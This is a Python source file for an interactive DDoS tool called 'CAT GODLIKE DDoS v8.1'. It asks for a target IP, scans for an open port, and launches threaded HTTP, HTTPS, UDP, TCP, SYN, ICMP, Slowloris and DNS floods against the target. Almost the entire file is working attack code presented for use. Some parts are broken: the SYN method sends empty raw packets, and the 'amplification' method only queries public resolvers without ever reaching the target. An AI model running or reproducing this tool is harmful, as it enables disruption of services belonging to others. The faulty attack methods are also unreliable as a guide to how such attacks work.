#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🐱 CAT GODLIKE DDoS v8.1 — FIXED EDITION
- Fixed thread crash
- Fixed root detection
- Clean error handling
- Works with sudo or without
"""

import sys
import os
import time
import random
import socket
import threading
import requests
from collections import defaultdict

# ========== COLORS ==========
R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
C = '\033[96m'; W = '\033[97m'; X = '\033[0m'
BOLD = '\033[1m'

# ========== BANNER ==========
def banner():
    print(f"""{C}
    ╔═══════════════════════════════════════════════════════════╗
    ║  {BOLD}🐱 CAT GODLIKE DDoS v8.1 — FIXED{X}{C}                    ║
    ║  {W}🔥 9 Methods | Interactive | Auto-Port | Stable{X}{C}        ║
    ╚═══════════════════════════════════════════════════════════╝
    {X}""")

# ========== PORT SCANNER ==========
def scan_ports(ip):
    common = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 3306, 3389, 5432, 6379, 27017, 8080, 8443]
    print(f"{Y}[+] Scanning {ip} for open ports...{X}")
    for port in common:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                s.close()
                print(f"{G}[+] Found open port: {port}{X}")
                return port
            s.close()
        except:
            pass
    print(f"{Y}[!] No open ports found. Using default: 80{X}")
    return 80

# ========== ATTACK BASE ==========
class Attack:
    def __init__(self, ip, port, threads, duration):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = defaultdict(int)
        self.lock = threading.Lock()
        self.threads_list = []
    
    def update(self, key):
        with self.lock:
            self.stats[key] += 1
    
    def get_stats(self):
        with self.lock:
            return dict(self.stats)
    
    def stop(self):
        self.running = False
        for t in self.threads_list:
            try:
                t.join(timeout=0.1)
            except:
                pass

# ========== ATTACK METHODS ==========

class HTTPFlood(Attack):
    def attack_loop(self):
        url = f"http://{self.ip}:{self.port}"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        while self.running:
            try:
                requests.get(url, headers=headers, timeout=1)
                self.update('sent')
            except:
                self.update('fail')

class HTTPSFlood(Attack):
    def attack_loop(self):
        url = f"https://{self.ip}:{self.port}"
        while self.running:
            try:
                requests.get(url, timeout=2, verify=False)
                self.update('sent')
            except:
                self.update('fail')

class SYNFlood(Attack):
    def attack_loop(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            pkt = b'\x00' * 1024
            while self.running:
                try:
                    s.sendto(pkt, (self.ip, self.port))
                    self.update('sent')
                except:
                    self.update('fail')
        except PermissionError:
            print(f"{R}[-] SYN requires root. Use: sudo python3 ddos.py{X}")
            self.running = False
        except:
            self.running = False

class UDPFlood(Attack):
    def attack_loop(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1500)
        while self.running:
            try:
                s.sendto(data, (self.ip, self.port))
                self.update('sent')
            except:
                self.update('fail')

class TCPFlood(Attack):
    def attack_loop(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.ip, self.port))
                s.send(b"GET / HTTP/1.1\r\n\r\n")
                s.close()
                self.update('sent')
            except:
                self.update('fail')

class ICMPFlood(Attack):
    def attack_loop(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            pkt = b'\x08\x00\x00\x00\x00\x00\x00\x00' + b'\x00' * 1024
            while self.running:
                try:
                    s.sendto(pkt, (self.ip, 0))
                    self.update('sent')
                except:
                    self.update('fail')
        except PermissionError:
            print(f"{R}[-] ICMP requires root. Use: sudo python3 ddos.py{X}")
            self.running = False

class Slowloris(Attack):
    def attack_loop(self):
        sockets = []
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.ip, self.port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: target\r\n")
                s.send(b"User-Agent: Mozilla/5.0\r\n")
                sockets.append(s)
                self.update('conn')
                if len(sockets) > 200:
                    for sock in sockets[:30]:
                        try:
                            sock.close()
                        except:
                            pass
                    sockets = sockets[30:]
            except:
                self.update('fail')

class DNSAmplification(Attack):
    def attack_loop(self):
        servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
        while self.running:
            try:
                s.sendto(query, (random.choice(servers), 53))
                self.update('sent')
            except:
                self.update('fail')

# ========== METHOD REGISTRY ==========
METHODS = {
    '1': {'name': 'HTTP Flood', 'class': HTTPFlood},
    '2': {'name': 'HTTPS Flood', 'class': HTTPSFlood},
    '3': {'name': 'SYN Flood', 'class': SYNFlood},
    '4': {'name': 'UDP Flood', 'class': UDPFlood},
    '5': {'name': 'TCP Flood', 'class': TCPFlood},
    '6': {'name': 'ICMP Flood', 'class': ICMPFlood},
    '7': {'name': 'Slowloris', 'class': Slowloris},
    '8': {'name': 'DNS Amplification', 'class': DNSAmplification},
}

# ========== START ATTACK ==========
def start_attack(method_id, ip, port, threads, duration):
    method = METHODS[method_id]
    attack = method['class'](ip, port, threads, duration)
    
    print(f"\n{G}{'='*60}{X}")
    print(f"{C}🐱 ATTACK STARTED{X}")
    print(f"{G}{'='*60}{X}")
    print(f"{W}[+] Method: {method['name']}{X}")
    print(f"[+] Target: {ip}:{port}")
    print(f"[+] Threads: {threads}")
    print(f"[+] Duration: {duration}s")
    print(f"{G}{'='*60}{X}\n")
    
    # Start threads with delay to avoid crash
    for i in range(threads):
        if not attack.running:
            break
        t = threading.Thread(target=attack.attack_loop)
        t.daemon = True
        try:
            t.start()
            attack.threads_list.append(t)
        except RuntimeError:
            print(f"{Y}[!] Max threads reached. Started {i} threads.{X}")
            break
        time.sleep(0.001)  # Small delay to prevent thread explosion
    
    start = time.time()
    try:
        while time.time() - start < duration and attack.running:
            stats = attack.get_stats()
            total = sum(stats.values())
            sys.stdout.write(f"\r{Y}[+] Packets: {total} | {stats}{X}")
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user.{X}")
    
    attack.stop()
    print(f"\n\n{G}[+] Final Stats: {attack.get_stats()}{X}")

# ========== MENU ==========
def menu():
    banner()
    
    ip = input(f"{C}[?] Target IP: {X}").strip()
    if not ip:
        print(f"{R}[-] IP required.{X}")
        return
    
    port_input = input(f"{C}[?] Port (Enter for auto-scan): {X}").strip()
    port = int(port_input) if port_input else scan_ports(ip)
    
    print(f"\n{Y}[+] Available Methods:{X}")
    for k, v in METHODS.items():
        print(f"  {G}{k}{X}. {v['name']}")
    
    method = input(f"\n{C}[?] Select method (1-8): {X}").strip()
    if method not in METHODS:
        print(f"{R}[-] Invalid choice.{X}")
        return
    
    threads = input(f"{C}[?] Threads (default 100, max 500): {X}").strip()
    threads = min(int(threads) if threads else 100, 500)
    
    duration = input(f"{C}[?] Duration (seconds, default 30): {X}").strip()
    duration = int(duration) if duration else 30
    
    print(f"\n{Y}[+] Summary:{X}")
    print(f"  Target: {G}{ip}:{port}{X}")
    print(f"  Method: {G}{METHODS[method]['name']}{X}")
    print(f"  Threads: {G}{threads}{X}")
    print(f"  Duration: {G}{duration}s{X}")
    
    if input(f"\n{C}[?] Start? (y/N): {X}").lower() != 'y':
        print(f"{R}[-] Cancelled.{X}")
        return
    
    start_attack(method, ip, port, threads, duration)

# ========== MAIN ==========
if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Exited.{X}")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[-] Error: {e}{X}")
        sys.exit(1)
